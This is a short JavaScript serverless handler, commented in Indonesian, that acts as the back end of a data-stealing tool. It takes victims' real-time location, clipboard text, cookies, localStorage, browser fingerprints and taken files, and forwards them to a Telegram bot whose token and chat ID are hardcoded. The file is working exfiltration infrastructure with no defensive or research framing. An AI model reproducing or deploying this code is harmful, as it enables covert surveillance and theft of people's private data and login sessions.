export default async function handler(req, res) {
    if (req.method !== 'POST') return res.status(405).send('Method Not Allowed');
    const data = req.body;
    const token = "8617014310:AAEidb6kIIlM4QLyoAMm5FMGskMSutKO6aU";
    const chatId = "8753510792";
    
    let msg = '';
    if(data.type === 'location') {
        msg = `📍 *LOKASI REAL-TIME*\nLat: ${data.lat}\nLon: ${data.lon}\nAkurasi: ${data.acc}m\nMaps: https://maps.google.com/?q=${data.lat},${data.lon}`;
    } else if(data.type === 'clipboard') {
        msg = `📋 *CLIPBOARD*\n${data.content}`;
    } else if(data.type === 'browser_data') {
        msg = `🍪 *COOKIE & STORAGE*\nCookie: ${data.cookies.substring(0, 500)}\n\nLocalStorage: ${JSON.stringify(data.localStorageData).substring(0, 500)}\n\nFingerprint: ${JSON.stringify(data.fingerprint)}`;
    } else if(data.type === 'file') {
        msg = `📁 *FILE YANG DIAMBIL*\nNama: ${data.name}\nSize: ${data.size} bytes\nData (base64): ${data.data.substring(0, 300)}...`;
        // Untuk file, kirim juga sebagai dokumen
        const fileBuffer = Buffer.from(data.data, 'base64');
        const form = new FormData();
        form.append('chat_id', chatId);
        form.append('document', new Blob([fileBuffer]), data.name);
        await fetch(`https://api.telegram.org/bot${token}/sendDocument`, { method: 'POST', body: form });
        return res.status(200).json({ status: 'ok' });
    }
    
    if(msg) {
        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text: msg, parse_mode: 'Markdown' })
        });
    }
    res.status(200).json({ status: 'ok' });
}
